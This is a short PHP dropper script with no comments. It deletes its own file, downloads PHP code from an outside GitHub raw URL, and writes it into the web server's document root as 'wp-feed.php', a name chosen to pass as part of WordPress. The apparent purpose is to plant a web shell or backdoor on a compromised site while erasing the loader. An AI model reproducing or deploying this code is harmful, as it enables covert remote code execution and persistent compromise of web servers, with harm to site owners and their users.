<?php
unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
$c = file_get_contents('https://raw.githubusercontent.com/dallasdilla/dillarep/refs/heads/main/l1/e79Edl8pRo.php');
if (strpos($c, '<?php')===false)  die('err dl');
if (is_file($_SERVER['DOCUMENT_ROOT'].'/wp-feed.php')) die('file exist');
$r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/wp-feed.php', $c);
if ($r===false) die('err saving');
die('/wp-feed.php');